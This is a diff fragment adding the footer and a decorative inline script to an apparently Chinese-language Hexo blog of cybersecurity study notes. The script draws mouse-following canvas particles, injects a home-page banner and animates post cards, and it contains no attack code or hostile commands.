+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<canvas id="particle-canvas"></canvas>
+<script>
+(function () {
+  'use strict';
+
+  // ====================================================================
+  // 1. 粒子动效：Canvas 粒子 + 连线 + 鼠标吸引
+  // ====================================================================
+  function initParticles() {
+    var canvas = document.getElementById('particle-canvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var particles = [];
+    var mouse = { x: -9999, y: -9999, radius: 140 };
+
+    // 配置
+    var COLORS = ['#a78bfa', '#60a5fa', '#34d399', '#f472b6'];
+    var MAX_PARTICLES = window.innerWidth < 768 ? 38 : 70;
+    var LINK_DISTANCE = 130;
+
+    function resize() {
+      canvas.width = window.innerWidth * dpr;
+      canvas.height = window.innerHeight * dpr;
+      canvas.style.width = window.innerWidth + 'px';
+      canvas.style.height = window.innerHeight + 'px';
+      ctx.scale(dpr, dpr);
+    }
+
+    function Particle() {
+      this.x = Math.random() * window.innerWidth;
+      this.y = Math.random() * window.innerHeight;
+      this.vx = (Math.random() - 0.5) * 0.35;
+      this.vy = (Math.random() - 0.5) * 0.35;
+      this.radius = Math.random() * 2 + 1.2;
+      this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+      this.baseAlpha = Math.random() * 0.4 + 0.4;
+    }
+
+    Particle.prototype.update = function () {
+      // 鼠标吸引
+      var dx = mouse.x - this.x;
+      var dy = mouse.y - this.y;
+      var dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < mouse.radius) {
+        var force = (mouse.radius - dist) / mouse.radius;
+        this.vx += (dx / dist) * force * 0.06;
+        this.vy += (dy / dist) * force * 0.06;
+      }
+
+      // 摩擦
+      this.vx *= 0.985;
+      this.vy *= 0.985;
+
+      // 限速
+      var speed = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+      if (speed > 1.5) {
+        this.vx = (this.vx / speed) * 1.5;
+        this.vy = (this.vy / speed) * 1.5;
+      }
+
+      this.x += this.vx;
+      this.y += this.vy;
+
+      // 边界回弹
+      if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+      if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+      this.x = Math.max(0, Math.min(window.innerWidth, this.x));
+      this.y = Math.max(0, Math.min(window.innerHeight, this.y));
+    };
+
+    Particle.prototype.draw = function () {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = this.color;
+      ctx.globalAlpha = this.baseAlpha;
+      ctx.fill();
+
+      // 柔光
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius * 3, 0, Math.PI * 2);
+      var grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius * 3);
+      grad.addColorStop(0, this.color);
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.globalAlpha = 0.12;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    };
+
+    function drawLinks() {
+      for (var i = 0; i < particles.length; i++) {
+        for (var j = i + 1; j < particles.length; j++) {
+          var p1 = particles[i];
+          var p2 = particles[j];
+          var dx = p1.x - p2.x;
+          var dy = p1.y - p2.y;
+          var dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < LINK_DISTANCE) {
+            var alpha = (1 - dist / LINK_DISTANCE) * 0.22;
+            ctx.beginPath();
+            ctx.strokeStyle = p1.color;
+            ctx.globalAlpha = alpha;
+            ctx.lineWidth = 1;
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+            ctx.globalAlpha = 1;
+          }
+        }
+      }
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+      drawLinks();
+      for (var i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function createParticles() {
+      particles = [];
+      for (var i = 0; i < MAX_PARTICLES; i++) particles.push(new Particle());
+    }
+
+    // 初始化
+    resize();
+    createParticles();
+    animate();
+
+    // 鼠标 / 触摸
+    window.addEventListener('mousemove', function (e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', function () {
+      mouse.x = -9999; mouse.y = -9999;
+    });
+    window.addEventListener('touchmove', function (e) {
+      if (e.touches[0]) {
+        mouse.x = e.touches[0].clientX;
+        mouse.y = e.touches[0].clientY;
+      }
+    });
+
+    // resize
+    var resizeTimer;
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(function () {
+        resize();
+        createParticles();
+      }, 200);
+    });
+
+    // 低性能模式：电池或低性能时减粒子
+    if (navigator.getBattery && navigator.getBattery()) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.discharging && battery.level < 0.2) {
+          MAX_PARTICLES = 25;
+          createParticles();
+        }
+      });
+    }
+  }
+
+  // ====================================================================
+  // 2. Hero 区：仅首页注入
+  // ====================================================================
+  function injectHero() {
+    // 通过 page 配置判断是否首页
+    var pageConfigs = document.querySelectorAll('script.next-config[data-name="page"]');
+    var isHome = false;
+    for (var i = 0; i < pageConfigs.length; i++) {
+      try {
+        var cfg = JSON.parse(pageConfigs[i].textContent || '{}');
+        if (cfg.isHome === true) { isHome = true; break; }
+      } catch (e) {}
+    }
+    if (!isHome) return;
+
+    var mainInner = document.querySelector('.main-inner.index.posts-expand');
+    if (!mainInner) return;
+    if (mainInner.querySelector('.hero-section')) return; // 防止重复
+
+    var hero = document.createElement('section');
+    hero.className = 'hero-section';
+    hero.innerHTML = ''
+      + '<div class="hero-content">'
+      + '  <span class="hero-eyebrow">CYBER · SECURITY · NOTES</span>'
+      + '  <h1 class="hero-title">网安学习笔记</h1>'
+      + '  <p class="hero-subtitle">'
+      + '    记录渗透测试、漏洞挖掘、安全工具开发的实践笔记。'
+      + '    <br>每一篇都是亲手敲过的 Payload、跑过的命令、踩过的坑。'
+      + '  </p>'
+      + '  <div class="hero-actions">'
+      + '    <a class="hero-btn hero-btn--primary" href="#main">'
+      + '      <i class="fa fa-book-open"></i> 开始阅读'
+      + '    </a>'
+      + '    <a class="hero-btn hero-btn--ghost" href="/about/">'
+      + '      <i class="fa fa-user"></i> 关于本站'
+      + '    </a>'
+      + '  </div>'
+      + '</div>'
+      + '<div class="hero-scroll-hint">SCROLL</div>';
+
+    mainInner.insertBefore(hero, mainInner.firstChild);
+
+    // 入场动画
+    setTimeout(function () {
+      hero.style.opacity = '0';
+      hero.style.transform = 'translateY(20px)';
+      hero.style.transition = 'opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1)';
+      requestAnimationFrame(function () {
+        hero.style.opacity = '1';
+        hero.style.transform = 'translateY(0)';
+      });
+    }, 50);
+  }
+
+  // ====================================================================
+  // 3. 卡片入场动画（首页文章）
+  // ====================================================================
+  function animateCards() {
+    var cards = document.querySelectorAll('.index.posts-expand .post-block');
+    if (!cards.length) return;
+    if (!('IntersectionObserver' in window)) return;
+
+    cards.forEach(function (card, idx) {
+      card.style.opacity = '0';
+      card.style.transform = 'translateY(24px)';
+      card.style.transition = 'opacity 0.6s ease ' + (idx * 0.08) + 's, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) ' + (idx * 0.08) + 's';
+    });
+
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    cards.forEach(function (card) { io.observe(card); });
+  }
+
+  // ====================================================================
+  // 4. 启动
+  // ====================================================================
+  function boot() {
+    try { initParticles(); } catch (e) { console.warn('particles failed:', e); }
+    try { injectHero(); } catch (e) { console.warn('hero inject failed:', e); }
+    try { animateCards(); } catch (e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+  // PJAX 兼容（NexT 用 pjax 切页）
+  window.addEventListener('pjax:success', boot);
+})();
+</script>
+
+</body>
+</html>
